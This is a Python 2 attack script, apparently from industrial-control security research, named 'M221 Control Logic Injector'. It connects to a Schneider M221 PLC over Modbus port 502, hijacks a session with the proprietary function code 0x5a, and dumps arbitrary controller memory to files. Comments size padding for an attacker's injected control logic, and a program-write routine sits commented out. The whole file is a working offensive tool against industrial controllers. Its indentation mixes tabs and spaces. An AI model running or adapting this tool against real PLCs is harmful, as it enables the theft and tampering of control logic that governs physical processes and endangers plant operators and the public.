import sys, os
import struct
import binascii
import socket
import argparse
import time
from random import randint

# M221 message (modbus payload after the function code) offset in TCP payload
M221_OFFSET = 8 
MODBUS_PORT = 502

M221_MAX_PAYLOAD_SIZE = 236
# Minimum size of m221 control logic which contains both input and ouput
MIN_CONTROL_LOGIC = 6

# Padding size can be configurable according to attacker's control logic
# 230 = M221_MAX_PAYLOAD_SIZE - MIN_CONTROL_LOGIC
FRONT_PADDING_SIZE = 230

# 235 = M221_MAX_PAYLOAD_SIZE - 1 (transfer one byte at a time)
BACK_PADDING_SIZE = 235

class M221_cl_injector():
    def __init__(self, targetIP):
        self.tranID = 1
        self.proto = '\x00\x00'
        self.len = 0
        self.unitID = '\x01'
        # Function code: Unity (Schneider) (90)
        self.fnc = '\x5a'

        self.m221_sid = '\x00'

        self.send_counter = 0

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((targetIP, MODBUS_PORT))

        self.set_m221_session_id()

        # (start addr, end addr, type) of each block
        self.conf1_info = ()
        self.conf2_info = ()
        self.code_info = ()
        self.data1_info = ()
        self.data2_info = ()
        self.zip_info = ()

    def send_recv_msg(self, modbus_data):
        self.send_counter += 1

        self.len = len(modbus_data) + len(self.unitID) + len(self.fnc)  
        tcp_payload = struct.pack(">H", self.tranID) + self.proto + struct.pack(">H", self.len) + self.unitID + self.fnc + modbus_data
        self.tranID = (self.tranID + 1) % 65536

        self.sock.send(tcp_payload)
        
        s = binascii.hexlify(tcp_payload)
        t = iter(s)

        recv_buf = self.sock.recv(1000)
        r = binascii.hexlify(recv_buf)
        t = iter(r)

        return recv_buf

    def close_socket(self):
        self.sock.shutdown(socket.SHUT_RDWR)
        self.sock.close()

    def close_connection(self):
        modbus_data = self.m221_sid + '\x11'
        self.send_recv_msg(modbus_data)
        self.close_socket()

    def set_m221_session_id(self):
        sid_req_payload = '\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        self.m221_sid = self.send_recv_msg(sid_req_payload)[-1]

    """
    def write_program(self):
        modbus_data = self.m221_sid + '\x29' + '\xb0\xe0\x01\x07\x06\x00\x7c\x2c\xfd\xe0\x2d\x02'

        self.send_recv_msg(modbus_data)
    """

    # Send read requests to PLC to get a file
    def read_file(self, file_addr, file_type, file_size):
        max_data_unit = 236
        remained = file_size
        file_buf = ''
        
        while (remained > 0):
            if remained >= max_data_unit:
                fragment_size = max_data_unit
            else:
                fragment_size = remained
            # read request: 0x28
            modbus_data = '\x00\x28' + struct.pack("<H", file_addr) + file_type + struct.pack("<H", fragment_size)
            file_buf += self.send_recv_msg(modbus_data)[M221_OFFSET+4:] # 0x00fe + response data size (2 bytes)
            remained -= fragment_size
            file_addr += fragment_size
        return file_buf        

    def read_mem(self, start_addr, size):
        max_data_unit = 236
        addr = start_addr
        remained = size
        file_buf = ''
        
        k = time.time()
	j = time.time()
	i = 0
        while (remained > 0):
            
            if remained >= max_data_unit:
                fragment_size = max_data_unit
            else:
                fragment_size = remained
            # read request: 0x28
            modbus_data = '\x00\x28' + struct.pack("<I", addr) + struct.pack("<H", fragment_size)
            file_buf += self.send_recv_msg(modbus_data)[M221_OFFSET+4:] # 0x00fe + response data size (2 bytes)
            remained -= fragment_size
            addr += fragment_size
            if (time.time() - k) > 10:
		print "remaining addresses", remained
		k = time.time()
            if (time.time() - j) > 3600:
		f = open("largetest" + str(i) + ".bin", "w")
    		f.write(file_buf)
    		f.close()
		file_buf = ''
		j = time.time()
		i = i + 1
        return file_buf        
        
def main():
    parser = argparse.ArgumentParser(description="M221 Control Logic Injector")

    parser.add_argument("plc_ip", help="IP address of the target PLC")
    parser.add_argument("start_addr", help="Start memory address")
    parser.add_argument("size", help="Byte size to read")
    parser.add_argument("output_file", help="Output file name")

    args = parser.parse_args()

    start_addr = int(args.start_addr)
    size = int(args.size)

    m221_injector = M221_cl_injector(args.plc_ip)
    print start_addr, " ", size
    mem_block = m221_injector.read_mem(start_addr, size)

    f = open(args.output_file, "w")
    f.write(mem_block)
    f.close()

if __name__ == '__main__':
    main()
